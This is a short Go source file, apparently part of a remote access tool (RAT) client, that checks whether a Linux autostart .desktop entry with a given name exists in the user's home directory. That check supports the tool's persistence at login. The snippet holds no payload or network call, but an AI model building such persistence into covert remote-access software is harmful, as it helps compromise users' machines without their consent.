//+build linux

package startup

import (
	"os"
	"rat/client/computer"
)

func Check(name string) bool {
	home := computer.GetComputerInformation().HomeDir

	dir := home + "/.config/autostart/"
	_, err := os.Stat(dir + name + ".desktop")

	return !os.IsNotExist(err)
}
